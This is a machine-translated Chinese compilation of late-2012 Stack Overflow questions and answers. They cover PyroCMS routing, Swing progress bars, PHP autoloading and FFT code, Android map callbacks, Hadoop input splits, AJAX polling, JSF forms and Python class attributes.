  theme_bw() 
```

![在此处输入图像描述](../Images/087029d21bbc37f4b55ade240d04d8fe.png)

# routes - 从 URI 中删除 FireSALE - 路由问题

> ID：14097138
> 
> 赞同：0
> 
> 时间：2012-12-31T03:32:29.580
> 
> 标签：routes, pyrocms

我已将模块安装`FireSALE`在`PyroCMS`.

如果可能，我想从 URI 中删除“ **FireSale** ”或将其更改为自定义字符串。IE

```
http://mydomain.com/firesale/cart 
```

至

```
http://mydomain.com/cart 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-04T14:22:33.343

您将能够在主 routes.php (system/cms/config/routes.php

在不发生冲突的情况下做到这一点的最佳方法（例如其他模块 uri，如 domain.com/blog 等）是在您的 routes.php 中放置类似以下代码的内容

```
$route['category/(order|layout)/([0-9]+)'] = 'firesale/front_category/$1/$2';
$route['category(:any)']                   = 'firesale/front_category/index$1';
$route['product(:any)']                    = 'firesale/front_product/index$1';
$route['search(:any)?']                    = 'firesale_search/search/index$1';
$route['cart(:any)?']                      = 'firesale/cart$1'; 
```

还将您的默认控制器从 pages 更改为 firesale（可选）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-11T08:57:17.630

当前可接受的方法是使用路由。作为使用路由的替代方法，您实际上可以重命名模块。可以使用脚本来完成。这有效地将模块的路径更改为您想要的路径。eg: 可用于将“blog”重命名为“articles”。

Linux： [https ://gist.github.com/3680107](https://gist.github.com/3680107)

OS X： [https ://gist.github.com/3949038](https://gist.github.com/3949038)

# ruby-on-rails - rails 中不同类型的表单助手

> ID：14097141
> 
> 赞同：0
> 
> 时间：2012-12-31T03:33:06.353
> 
> 标签：ruby-on-rails, forms, helpers

我对rails很陌生，脚手架会生成这样的表单元素：

```
<%= f.label :completed_at %> 
```

Rails 的表单助手文档以不同的形式讨论它们，作为函数：

```
<%= label( :giveaway, :completed_at, "Closing Date", :class => "control-label" ) %> 
```

我在哪里可以找到前者的文档？这个版本的表单助手有名字吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-31T03:46:34.367

[http://guides.rubyonrails.org/form_helpers.html](http://guides.rubyonrails.org/form_helpers.html)可能会有所帮助

我只想称它为表单标签助手。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-23T18:07:52.400

1.  `<%= f.label :completed_at %>``f`在通过`form builder`对象的迭代期间引用项目

2.  `<%= label( :giveaway, :completed_at, "Closing Date", :class => "control-label" ) %>`是一种静态方法，又称“表单助手”方法，用于动态生成任何标签，不一定在表单构建器对象的上下文中

# java - 如何使 jprogressbar 与我的算法并行运行

> ID：14097149
> 
> 赞同：0
> 
> 时间：2012-12-31T03:34:33.207
> 
> 标签：java, swing, jprogressbar

> **可能重复：**
> [Java GUI JProgressBar 不绘画](https://stackoverflow.com/questions/3154847/java-gui-jprogressbar-not-painting)
> [进度条可以在 main 之外的类中使用吗？](https://stackoverflow.com/questions/4637215/can-a-progress-bar-be-used-in-a-class-outside-main)

我正在使用 Netbeans 拖放来执行应用程序。我将从用户那里获得输入并使用输入来运行我的算法。该算法将需要不同的时间来运行，然后在新的帧中显示其结果。在等待算法运行时，我希望添加一个进度条。当用户单击按钮提交输入时，我添加了以下代码。

```
 private void jButton1ActionPerformed(java.awt.event.ActionEvent evt) {   

    final JProgressBar bar = new JProgressBar(0,250000);
    bar.setValue(1000);
    bar.setIndeterminate(false);
    JOptionPane jO = new JOptionPane(bar);

    Thread th = new Thread(){

    public void run(){
        for(int i = 1000 ; i < 250000 ; i+=10000){
           bar.setValue(i);
            try {
                Thread.sleep(100);
           } catch (InterruptedException e) {
            }
        }
    }
};
th.start();

final JDialog dialog = jO.createDialog(jO,"Experiment X");
dialog.pack();
dialog.setVisible(true);

//Algorithm goes here 
```

进度条确实显示并运行。但是当进度条值更新到最后时，只有我的算法运行。我看透了其他人的例子，但我并不真正理解它是如何工作的。

有人能告诉我哪里错了吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-31T06:43:48.313

Swing 中一些最重要的概念是

**不要**在事件调度线程 (ETD) 中执行任何长时间运行/阻塞的操作。这将导致 UI 出现“冻结”且无响应。好在，你似乎明白这一点。

**不要**从除 EDT 之外的任何线程创建或修改任何 ui 组件。你不这样做。

您最好的行动原因是利用[`SwingWorker`](http://docs.oracle.com/javase/tutorial/uiswing/concurrency/worker.html)，这允许您执行长时间运行的操作，同时向侦听器提供进度反馈。

```
public class TestProgress {

    public static void main(String[] args) {
        new TestProgress();
    }

    public TestProgress() {
        EventQueue.invokeLater(new Runnable() {
            @Override
            public void run() {
                try {
                    UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
                } catch (ClassNotFoundException ex) {
                } catch (InstantiationException ex) {
                } catch (IllegalAccessException ex) {
                } catch (UnsupportedLookAndFeelException ex) {
                }

                ProgressPane progressPane = new ProgressPane();
                JFrame frame = new JFrame("Test");
                frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
                frame.setLayout(new BorderLayout());
                frame.add(progressPane);
                frame.setSize(200, 200);
                frame.setLocationRelativeTo(null);
                frame.setVisible(true);

//                progressPane.doWork();
            }
        });
    }

    public class ProgressPane extends JPanel {

        private JProgressBar progressBar;
        private JButton startButton;

        public ProgressPane() {

            setLayout(new GridBagLayout());
            progressBar = new JProgressBar();

            GridBagConstraints gbc = new GridBagConstraints();
            gbc.gridx = 0;
            gbc.gridy = 0;
            add(progressBar, gbc);
            startButton = new JButton("Start");
            gbc.gridy = 1;
            add(startButton, gbc);

            startButton.addActionListener(new ActionListener() {
                @Override
                public void actionPerformed(ActionEvent e) {
                    startButton.setEnabled(false);
                    doWork();
                }
            });

        }

        public void doWork() {

            Worker worker = new Worker();
            worker.addPropertyChangeListener(new PropertyChangeListener() {
                @Override
                public void propertyChange(PropertyChangeEvent evt) {
                    if ("progress".equals(evt.getPropertyName())) {
                        progressBar.setValue((Integer) evt.getNewValue());
                    }
                }
            });

            worker.execute();

        }

        public class Worker extends SwingWorker<Object, Object> {

            @Override
            protected void done() {
                startButton.setEnabled(true);
            }

            @Override
            protected Object doInBackground() throws Exception {

                for (int index = 0; index < 1000; index++) {
                    int progress = Math.round(((float) index / 1000f) * 100f);
                    setProgress(progress);

                    Thread.sleep(10);
                }

                return null;
            }
        }
    }
} 
```

您的其他选择是使用 a [`ProgressMonitor`](http://docs.oracle.com/javase/7/docs/api/javax/swing/ProgressMonitor.html)，或者，如果您真的很绝望，请使用[`SwingUtilities#invokeLater(Runnable)`](http://docs.oracle.com/javase/7/docs/api/javax/swing/SwingUtilities.html#invokeLater%28java.lang.Runnable%29)，但是，我真的鼓励您`SwingWorker`改用 ;)

# php - spl_autoload 未加载（区分大小写？）

> ID：14097152
> 
> 赞同：0
> 
> 时间：2012-12-31T03:35:01.103
> 
> 标签：php, zend-framework2, spl-autoload-register

我正在使用 ZF2 作为库。我有一个非常标准的实现，`spl_autoload_register`如下所示：

```
set_include_path(join(PATH_SEPARATOR, array(
    get_include_path(),
    ROOT . DS . 'library',
    ROOT . DS . 'application',
)));

spl_autoload_register(); 
```

在哪里：

```
define('DS', DIRECTORY_SEPARATOR);
define('ROOT', dirname(dirname(__FILE__))); 
```

在我的 Mac 上，一切正常。在我的 CentOS 服务器上，不。我唯一一次看到`spl_autoload_register`不喜欢这样的问题是当我尝试使用 CamelCasing 等时。显然，情况并非如此。我正在尝试加载：

```
\Zend\Config\Config 
```

现在，我的目录结构如下所示：

```
/application
    /controller
    /model
       /objects
       /dao
       /weeeeeeee 
    /view
      /template_html
/library
    /core
    /Zend
      /Config 
```

你明白了。

那么，为什么这不起作用？

编辑：请告诉它不是在寻找 config.php 而不是 Config.php ...

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-16T15:10:43.710

`spl_autoload`是区分大小写的。所有类都映射到小写文件名。是的，这太疯狂了。谷歌 php 错误 #49625 和 #48129 的一些背景故事。

解决方案：

1.  将所有包含的类重命名为小写，包括所有包含的路径
2.  编写一个更好的自动加载器来处理混合大小写路径
3.  使用 Composer 的自动加载器。

重命名所有内容既不现实又愚蠢，我不想再次重新发明轮子，但我很幸运能够使用 Composer 的自动加载器加载自定义库。

[Composer 自动加载参考](http://getcomposer.org/doc/01-basic-usage.md#autoloading)

Composer 有一个[ZF2 包](https://packagist.org/packages/zendframework/zendframework)，但您可以通过在文件中添加自动加载定义来手动加载您的包`composer.json`：

```
{
    "autoload": {
        "psr-0": {"Zend": "library/"}
    }
} 
```

# java - 未调用子类抽象方法

> ID：14097153
> 
> 赞同：3
> 
> 时间：2012-12-31T03:35:07.760
> 
> 标签：java, polymorphism, subclass, superclass

我会发布一些代码然后问我的问题，因为我认为它需要一些解释。所以这是我的超类的基本表示：

```
public abstract class ModeOfTransport {
    public abstract void updateView(String name);
} 
```

以下是我的子类的一些示例：

```
public class Bus extends ModeOfTransport {
    @Override
    public void updateView(String stopName) {
        System.out.println("BUS");
    }
}

public class Train extends ModeOfTransport {
    @Override
    public void updateView(String stopName) {
        System.out.println("TRAIN");
    }
} 
```

我有一个`switch`旨在能够决定`updateView()`调用哪个版本的方法：

```
switch(transportType) {
    case BUS:
        handleInfo(new Bus());
        break;
    case TRAIN:
        handleInfo(new Train());
        break;
    default:
        break;
}

private void handleInfo(ModeOfTransport transportType) {
    transportType.updateView(name);
} 
```

我的目标是打印出`TRAIN`或`BUS`。目前，它什么也没打印！我猜是因为它调用了没有主体的父类中的抽象方法。

任何人都可以为我阐明这一点吗？

另外，作为一个附带问题，这是否属于`polymorphism`or `inheritance`？

谢谢！

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-31T03:38:53.557

我已经成功了。我不知道你做错了什么，但也许你会从这个源代码中弄清楚。

```
package transport;

/**
 * ModeOfTransport description here
 * @author Michael
 * @link http://stackoverflow.com/questions/14097153/java-subclass-abstract-method-not-being-called/14097167#14097153
 * @since 12/30/12 10:46 PM
 */
public abstract class ModeOfTransport {
    public abstract void updateView(String name);
}

package transport;

/**
 * Bus description here
 * @author Michael
 * @link http://stackoverflow.com/questions/14097153/java-subclass-abstract-method-not-being-called/14097167#14097153
 * @since 12/30/12 10:47 PM
 */
public class Bus extends ModeOfTransport {
    @Override
    public void updateView(String name) {
        System.out.println("BUS");
    }
}

package transport;

/**
 * Train description here
 * @author Michael
 * @link
 * @since 12/30/12 10:48 PM
 */
public class Train extends ModeOfTransport {
    @Override
    public void updateView(String name) {
        System.out.println("TRAIN");
    }
}

package transport;

/**
 * TransportVisitor description here
 * @author Michael
 * @link http://stackoverflow.com/questions/14097153/java-subclass-abstract-method-not-being-called/14097167#14097153
 * @since 12/30/12 10:49 PM
 */
public class TransportVisitor {
    public static void main(String[] args) {
        TransportVisitor visitor = new TransportVisitor();
        String [] types = { "TRAIN", "BUS" };
        for (String type : types) {
            visitor.updateView(type);
        }
    }

    public void updateView(String transportTypeName) {
        switch(transportTypeName) {
            case "BUS":
                handleInfo(new Bus());
                break;
            case "TRAIN":
                handleInfo(new Train());
                break;
            default:
                break;
        }
    }

    private void handleInfo(ModeOfTransport transportType) {
        transportType.updateView((String) null);
    }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-31T03:40:00.910

你有不一致的命名方法。您的基类有`updateView`，但您的派生类有`updateWebView`此外，由于您还没有使用任何基类方法，这将属于多态性，这意味着您可以根据需要使用接口。

# python - HTTPError 与示例 biopython 代码查询 pubmed

> ID：14097157
> 
> 赞同：0
> 
> 时间：2012-12-31T03:36:10.163
> 
> 标签：python, api, biopython, pubmed

我想通过python查询pubmed。我找到了一个很好的生物学相关库来做到这一点：http: [//biopython.org/DIST/docs/tutorial/Tutorial.html](http://biopython.org/DIST/docs/tutorial/Tutorial.html)

我在这里找到了一些示例代码：http: [//biopython.org/DIST/docs/tutorial/Tutorial.html#htoc116](http://biopython.org/DIST/docs/tutorial/Tutorial.html#htoc116)

```
from Bio import Entrez
Entrez.email = "A.N.Other@example.com"     
handle = Entrez.egquery(term="orchid")
record = Entrez.read(handle)
for row in record["eGQueryResult"]:
  if row["DbName"]=="pubmed":
    print row["Count"] 
```

当我更改电子邮件并运行此代码时，我收到以下错误：

```
Traceback (most recent call last):
  File "pubmed.py", line 15, in <module>
    handle = Entrez.egquery(term=my_query)
  File "/usr/lib/pymodules/python2.7/Bio/Entrez/__init__.py", line 299, in egquery
    return _open(cgi, variables)
  File "/usr/lib/pymodules/python2.7/Bio/Entrez/__init__.py", line 442, in _open
    raise exception
urllib2.HTTPError: HTTP Error 404: Not Found 
```

~~问题的根源没有太多线索。我不知道它试图访问什么网址。~~当我搜索“pubmed entrez urllib2.HTTPError: HTTP Error 404: Not Found”时，我得到 8 个结果，其中没有一个是相关的（除了这个线程）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-31T12:52:46.620

这个例子对我有用。看起来这是一个临时的 NCBI 问题，尽管“错误 404”非常不寻常，并且不是我在 Entrez 中看到的典型网络问题。一般来说，对于任何网络资源，在担心出现问题之前给它几个小时或一天的时间。

还有一个您可能希望订阅的 Entrez Utilities 公告邮件列表，尽管如果最近有计划的服务中断，这里没有提到： [http ://www.ncbi.nlm.nih.gov/mailman/listinfo/utilities -宣布](http://www.ncbi.nlm.nih.gov/mailman/listinfo/utilities-announce)

# php - PHP FFT模块错误

> ID：14097158
> 
> 赞同：1
> 
> 时间：2012-12-31T03:36:15.363
> 
> 标签：php, module, fft

我最近为 PHP 编写了一个 FFT（快速傅立叶变换）模块。当我尝试测试它时，它总是会抛出一个错误，即数组`$this->reverseTable`有一些未定义的索引。我不知道如何解决这个问题。

这是PHP代码：

```
<?php
class FourierTransform {
    public $bufferSize;
    public $sampleRate;
    public $bandwidth;
    public $spectrum = array();
    public $real = array();
    public $imag = array();
    public $peakBand = 0;
    public $peak = 0;

    public function __construct($bufferSize,$sampleRate){
        $this->bufferSize = $bufferSize;
        $this->sampleRate = $sampleRate;
        $this->bandwidth = 2 / $bufferSize * $sampleRate / 2;
    }

    public function getBandFrequency($index){
        return $this->bandwidth * $index + $this->bandwidth / 2;
    }

    public function calculateSpectrum(){
        $bSi = 2 / $this->bufferSize;
        for($i = 0,$N = $this->bufferSize/2; $i < $N; $i++){
            $rval = $this->real[$i];
            $ival = $this->imag[$i];
            $mag = $bSi * sqrt($rval * $rval + $ival * $ival);
            if($mag > $this->peak){
                $this->peakBand = $i;
                $this->peak = $mag;
            }
            $this->spectrum[$i] = $mag;
        }
    }
}

class FFT extends FourierTransform {
    public $reverseTable = array();
    public $sinTable = array();
    public $cosTable = array();

    public function __construct($bufferSize,$sampleRate){
        parent::__construct($bufferSize,$sampleRate);
        $limit = 1;
        $bit = $bufferSize >> 1;
        while($limit < $bufferSize){
            for($i = 0; $i < $limit; $i++){
                $this->reverseTable[$i + $limit] = $this->reverseTable[$i] + $bit;
            }
            $limit = $limit << 1;
            $bit = $bit >> 1;
        }
        for($i = 0; $i < $bufferSize; $i++){
            $this->sinTable[$i] = sin(-M_PI / $i);
            $this->cosTable[$i] = cos(-M_PI / $i);
        }
    }

    public function foward($buffer){
        $k = floor(log($this->bufferSize,2));
        if(pow(2,$k) !== $this->bufferSize) throw new Exception('Invalid buffer size, must be a power of 2.');
        if($this->bufferSize !== count($buffer)) throw new Exception('Supplied buffer is not the same size as defined FFT.');

        $halfSize = 1;
        for($i = 0; $i < $this->bufferSize; $i++){
            $this->real[$i] = $buffer[$this->reverseTable[$i]];
            $this->imag[$i] = 0;
        }
        while($halfSize < $this->bufferSize){
            $phaseShiftReal = $this->cosTable[$halfSize];
            $phaseShiftImag = $this->sinTable[$halfSize];
            $currentPhaseShiftReal = 1;
            $currentPhaseShiftImag = 0;
            for($fftStep = 0; $fftStep < $halfSize; $fftStep++){
                while($fftStep < $this->bufferSize){
                    $off = $fftStep + $halfSize;
                    $tr = ($currentPhaseShiftReal * $this->real[$off]) - ($currentPhaseShiftImag * $this->imag[$off]);
                    $ti = ($currentPhaseShiftReal * $this->imag[$off]) + ($currentPhaseShiftImag * $this->real[$off]);
                    $this->real[$off] = $this->real[$fftStep] - $tr;
                    $this->imag[$off] = $this->imag[$fftStep] - $ti;
                    $this->real[$fftStep] += $tr;
                    $this->imag[$fftStep] += $ti;
                    $fftStep += $halfSize << 1;
                }
                $tmpReal = $currentPhaseShiftReal;
                $currentPhaseShiftReal = ($tmpReal * $phaseShiftReal) - ($currentPhaseShiftImag * $phaseShiftImag);
                $currentPhaseShiftImag = ($tmpReal * $phaseShiftImag) + ($currentPhaseShiftImag * $phaseShiftReal);
            }
            $halfSize = $halfSize << 1;
        }
        $this->calculateSpectrum();
    }
}
?> 
```

测试样本是 440Hz 的正弦波。

当我尝试运行代码时，它会抛出此错误

> 注意：未定义的偏移量：第 48 行 C:\Program Files (x86)\EasyPHP-12.1\www\fft.php 中的 0

不断地。

有问题的数组有这样的数据：

```
Array
(
    [1] => 512
    [2] => 256
    [3] => 768
    [4] => 128
    [5] => 640
    [6] => 384
    [7] => 896
    [8] => 64
    [9] => 576
    [10] => 320
    [11] => 832
    [12] => 192
    [13] => 704
    [14] => 448
    [15] => 960
    [16] => 32
    [17] => 544
    [18] => 288
    [19] => 800
    [20] => 160
    [21] => 672
    [22] => 416
    [23] => 928
    [24] => 96
    [25] => 608
    [26] => 352
    [27] => 864
    [28] => 224
    [29] => 736
    [30] => 480
    [31] => 992
    [32] => 16
    [33] => 528
    [34] => 272
    [35] => 784
    [36] => 144
    [37] => 656
    [38] => 400
    [39] => 912
    [40] => 80
    [41] => 592
    [42] => 336
    [43] => 848
    [44] => 208
    [45] => 720
    ...
    [978] => 303
    [979] => 815
    [980] => 175
    [981] => 687
    [982] => 431
    [983] => 943
    [984] => 111
    [985] => 623
    [986] => 367
    [987] => 879
    [988] => 239
    [989] => 751
    [990] => 495
    [991] => 1007
    [992] => 31
    [993] => 543
    [994] => 287
    [995] => 799
    [996] => 159
    [997] => 671
    [998] => 415
    [999] => 927
    [1000] => 95
    [1001] => 607
    [1002] => 351
    [1003] => 863
    [1004] => 223
    [1005] => 735
    [1006] => 479
    [1007] => 991
    [1008] => 63
    [1009] => 575
    [1010] => 319
    [1011] => 831
    [1012] => 191
    [1013] => 703
    [1014] => 447
    [1015] => 959
    [1016] => 127
    [1017] => 639
    [1018] => 383
    [1019] => 895
    [1020] => 255
    [1021] => 767
    [1022] => 511
    [1023] => 1023
) 
```

**编辑**：先前的问题已解决，但现在又提出了另一个问题。在函数`forward()`中它会抛出一个未捕获的异常，`Invalid buffer size, must be a power of 2.`即使缓冲区大小是正确的。

任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-31T03:45:20.137

假设这是整个类，我认为问题在于您的 FFT 构造函数中的这一行：

```
$this->reverseTable[$i + $limit] = $this->reverseTable[$i] + $bit; 
```

据我所知，您声明`reverseTable`为一个数组，但是这一行是类中唯一将任何元素添加到该数组的地方，因此您`reverseTable[$i+$limit]`使用从未定义的`reverseTable[$i]`值设置元素的事实将给出`while`当它尝试使用未定义的索引`$i`（`reverseTable[$i]`）时，您在该循环的第一次迭代中出现问题。**在进入该循环之前，您****必须给出一个值。`reverseTable[0]`**

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-31T03:48:37.197

虽然你没有提供这条线的位置，但我猜它与这条线有关：

```
$this->reverseTable[$i + $limit] = $this->reverseTable[$i] + $bit; 
```

这是在您的构造函数中，而且这一点看起来特别错误`$this->reverseTable[$i] + $bit;`。您正在请求`reverseTable`数组中的值，但此键未在构造函数中的任何位置初始化。

我不确定如何解决此问题，因为这是您的逻辑错误。

# android - Android animateCamera GoogleMap.CancelableCallback 用法

> ID：14097161
> 
> 赞同：9
> 
> 时间：2012-12-31T03:37:09.280
> 
> 标签：android, google-maps

我完全不知道如何在 android SDK 中使用“animateCamera”的回调功能。

我想使用 onFinish 功能，谢谢。

**public final void animateCamera（CameraUpdate 更新，GoogleMap.CancelableCallback 回调）**

[http://developer.android.com/reference/com/google/android/gms/maps/GoogleMap.html#animateCamera%28com.google.android.gms.maps.CameraUpdate,%20com.google.android.gms.maps .GoogleMap.CancelableCallback%29](http://developer.android.com/reference/com/google/android/gms/maps/GoogleMap.html#animateCamera%28com.google.android.gms.maps.CameraUpdate,%20com.google.android.gms.maps.GoogleMap.CancelableCallback%29)

[http://developer.android.com/reference/com/google/android/gms/maps/GoogleMap.CancelableCallback.html](http://developer.android.com/reference/com/google/android/gms/maps/GoogleMap.CancelableCallback.html)

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-12-31T03:47:05.423

不用担心，我无法相信在寻找年龄后发布此内容的那一刻，我在 google play maps api samples 中找到了一个显示它的示例....：

sdk\extras\google\google_play_services\samples\maps\src\com\example\mapdemo\CameraDemoActivity.java

```
changeCamera(CameraUpdateFactory.newCameraPosition(SYDNEY), 
        new CancelableCallback() {
    @Override
    public void onFinish() {
        Toast.makeText(getBaseContext(), "Animation to Sydney complete", 
            Toast.LENGTH_SHORT).show();
    }

    @Override
    public void onCancel() {
        Toast.makeText(getBaseContext(), "Animation to Sydney canceled", 
            Toast.LENGTH_SHORT).show();
    }
}); 
```

# hdfs - Hadoop分布文件系统

> ID：14097162
> 
> 赞同：1
> 
> 时间：2012-12-31T03:37:33.440
> 
> 标签：hdfs, filesplitting

我想修改将输入文件拆分为块并存储在 Hadoop 分布式文件系统中的方式。（例如，它根据块大小拆分文件，但我的应用程序需要根据文件内容拆分文件）。所以我想确切地知道根据HADOOP的块大小属性将文件分成块的类。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-03T13:00:16.093

Blocks 是 HDFS 的抽象，InputSplits 是 MapReduce 的抽象。默认情况下，一个 HDFS 块对应一个可以修改的 InputSplit。

默认情况下，HDFS 将块划分为精确的 64MB 块，并且还可能跨记录边界进行拆分。在文件输入格式的情况下，由 InputFormat 从数据块创建 InputSplits。每个 InputSplit 将由一个单独的映射器处理。

> 例如它根据块大小拆分文件，但我的应用程序需要根据文件内容拆分文件

考虑 InputSplits 并根据应用程序要求创建新的 InputFormat。这里有一些关于创建新 InputFormat 的[教程](http://www.infoq.com/articles/HadoopInputFormat)（[1、2](http://developer.yahoo.com/hadoop/tutorial/module5.html#fileformat)和[3 ）。](http://bigdatacircus.com/2012/08/01/wordcount-with-custom-record-reader-of-textinputformat/)

# javascript - 快速发送时不接收异步 AJAX 请求

> ID：14097165
> 
> 赞同：0
> 
> 时间：2012-12-31T03:38:32.033
> 
> 标签：javascript, ajax, asynchronous, xmlhttprequest

我的脚本正在向页面 ( ) 发送一个 GET 请求，`http://example.org/getlisting/`而该页面又以 JSON 对象进行响应。( `{"success":true, "listingid":"123456"}`)

这是一个示例片段：

```
var listingAjax = new XMLHttpRequest();
listingAjax.addEventListener("load", listingCallback, false);

function listingCallback(event) {
    if (this.readyState == 4 && this.status == 200) {
       console.log(this.responseText);
    }
}

listingAjax.open("GET", "http://example.org/getlisting/", true);
listingAjax.send(); 
```

很简单。该脚本也可以完美运行！当我想这样做时，问题就出现了：

```
var listingAjax = new XMLHttpRequest();
listingAjax.addEventListener("load", listingCallback, false);

function listingCallback(event) {
    if (this.readyState == 4 && this.status == 200) {
       console.log(this.responseText);
    }
}

window.setInterval(function() {
    listingAjax.open("GET", "http://example.org/getlisting/", true);
    listingAjax.send();
}, 250); 
```

我想应该发生的是我的脚本将创建一个稳定的 GET 请求流，这些请求被发送到服务器，然后服务器响应每个请求。然后，我的脚本将接收服务器的响应并将它们发送到回调。

更准确地说，假设我让这个脚本运行了 5 秒，我的脚本在那段时间向服务器发送了 20 个 GET 请求。我希望我的回调 ( `listingCallback`) 也会被调用 20 次。

问题是，它不是。几乎看起来，如果我在收到来自服务器的响应之前发出了两个 GET 请求，那么响应就会被忽略或丢弃。

我在做什么错/误解？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-31T03:43:39.607

许多浏览器都内置了每个服务器的最大打开 HTTP 连接数。你可能会撞到那堵墙？

这是 Mozilla 的一个示例，但大多数浏览器都应该内置这样的内容：http: [//kb.mozillazine.org/Network.http.max-connections-per-server](http://kb.mozillazine.org/Network.http.max-connections-per-server)

关于 Chrome 的较早问题：将 [Google Chrome 的 max-connections-per-server 限制增加到 6 以上](https://stackoverflow.com/questions/8404464/increasing-google-chromes-max-connections-per-server-limit-to-more-then-6)

如果您有 Windows，请查看 Fiddler 之类的工具 - 您可能能够查看是否所有请求都实际发出，或者浏览器是否正在排队/杀死其中一些请求。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-31T03:54:26.967

您不能在新连接正在进行时重用相同的`XMLHttpRequest`对象[`open`](https://developer.mozilla.org/en-US/docs/DOM/XMLHttpRequest#open%28%29)，否则会导致突然的[`abort`](https://developer.mozilla.org/en-US/docs/DOM/XMLHttpRequest#abort%28%29)离子（在 Chrome 中测试）。为每个调用使用一个新`XMLHttpRequest`对象将解决这个问题：

```
function listingCallback(event) {
    if (this.readyState == 4 && this.status == 200) {
       console.log(this.responseText);
    }
}

window.setInterval(function() {
    var listingAjax = new XMLHttpRequest();
    listingAjax.addEventListener("load", listingCallback, false);
    listingAjax.open("GET", "http://example.org/getlisting/", true);
    listingAjax.send();
}, 250); 
```

这将很好地为每个间隔排队一个新的 ajax 请求。

[**小提琴**](http://jsfiddle.net/vZB2b/)

请注意，由于每个浏览器固有的并发 ajax 调用的最大限制，过于频繁的调用可能会导致速度变慢。
不过，现代浏览器有一个相当公平的限制和非常好的并行性，所以只要你只获取一个小的 JSON 对象，即使使用拨号，现代浏览器也应该能够跟上。

上次我制作了一个 ajax 轮询脚本时，我会在前一个请求的成功处理程序中启动一个新请求，而不是使用间隔，以最大限度地减少 ajax 调用。不确定此逻辑是否适用于您的应用程序。

# eclipse - 如何在 Eclipse 上显示 android sdk 和 adt 管理器的快捷方式

> ID：14097169
> 
> 赞同：0
> 
> 时间：2012-12-31T03:38:56.427
> 
> 标签：eclipse

我已经更新了日食。但我必须始终转到文件系统上的 android sdk 文件夹并导航到该文件夹​​中的工具。在早期的版本中，eclipse 上的 adt 和 sdk 工具有捷径。它们显示在eclipse的菜单栏下。有没有办法让他们重新回到日食？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-31T06:40:58.033

首先，这些应该会自动显示在 Eclipse 的“Java”透视图中。您可以使用显示它`Window->Open Perspective->Java`（或者如果`Java`没有出现，请使用`Other`并`Java`从列表中选择）。

如果您想将其添加到其他透视图（如`Java EE`透视图）

1.  选择`Window->Customize Perspective`
2.  单击`Command Groups Availability`选项卡
3.  查看`Android SDK and AVD Manager`
4.  按`Ok`

您可能还需要检查`Android Wizards`以获取用于创建 Android XML 文件的按钮。

# jsf - 如何以 JSF 形式将 inputText 值作为查询字符串传递

> ID：14097171
> 
> 赞同：1
> 
> 时间：2012-12-31T03:39:26.350
> 
> 标签：jsf, jsf-2

我想在我的网络应用程序中实现一个搜索框。JSF`<h:form>`应该将我重定向到 products.xhtml?search=somestring。它应该与以下 HTML 相同：

```
<form action="products.xhtml" method="GET">
  <input type="text" name="search" />
  <input type="submit" value="Submit"  />
</form> 
```

我遇到的类似问题的所有解决方案都是在没有查询字符串的情况下重定向到另一个页面

```
<h:form>
  <h:inputText value="#{product.searchString}"/>
  <h:commandButton value="Submit" action="products?faces-redirect=true&amp;includeViewParams=true"/>
</h:form> 
```

.

```
<h:form>
    <h:inputText valueChangeListener="#{product.searchStringChanged}" />
    <h:link value="Submit"  outcome="products">
        <f:param name="search" value="#{product.searchString}" />
    </h:link>
</h:form> 
```

OR 构建查询字符串但重定向到同一页面。不使用纯 HTML 的原因是为了保留 JSF 会话管理的好处。

**编辑**

在[BalusC 的帖子](https://stackoverflow.com/questions/6377798/what-can-fmetadata-and-fviewparam-be-used-for/6377957#6377957)和[https://blogs.oracle.com/enterprisetechtips/entry/post_redirect_get_and_jsf](https://blogs.oracle.com/enterprisetechtips/entry/post_redirect_get_and_jsf)的帮助下，我想出了以下解决方案：

```
<f:metadata>
  <f:viewParam name="search" value="#{product.search}" />       
</f:metadata> 

<h:form>
  <h:inputText value="${product.search}"/>
  <h:commandLink action="products?faces-redirect=true&amp;includeViewParams=true" value="Search"/>
</h:form> 
```

# python - 简单奇怪的基本python行为

> ID：14097172
> 
> 赞同：1
> 
> 时间：2012-12-31T03:39:34.217
> 
> 标签：python

有谁知道为什么下面的代码会打印 0 和 1 而不是 5 和 2，在 csharp 中类似的代码会打印 5 和 2，我只是想弄清楚这里的逻辑。

```
class Myclass:
    a = 0
    b = 1 

def foo():
    for x in range(1):
        for y in range(1):
            myclass = Myclass()
            if y == 1:
                myclass.a = 5
            if y == 1:
                myclass.b = 2
            ClassList.append(Myclass)

    for x in ClassList:
        print x.a   
        print x.b

ClassList = []
foo() 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-31T03:43:48.780

因为`y`从不`1`：

```
>>> range(1)
[0] 
```

你想要的是`range(2)`

并且以防万一你不知道......目前你正在使用`a`和`b`作为类属性而不是实例属性。对于您进行值分配的特定情况，您不会看到问题，但是如果您定义了字典或列表，并且正在更改这些对象的键/索引，那么它将是所有对象共享的同一个对象实例。

```
class Myclass(object):
    a = []
    b = {}

obj1 = Myclass()
obj2 = Myclass()
obj1.a.append('foo')
obj1.b['biz'] = 'baz'
print obj2.a
# ['foo']
print obj2.b
# {'biz': 'baz'} 
```

...与实例属性

```
class Myclass(object):
    def __init__(self):
        self.a = []
        self.b = {} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-31T03:43:52.870

原因是`range(1)`返回`[0]`，而不是`[0, 1]`，因此您的`y == 1`测试永远不会评估为真。

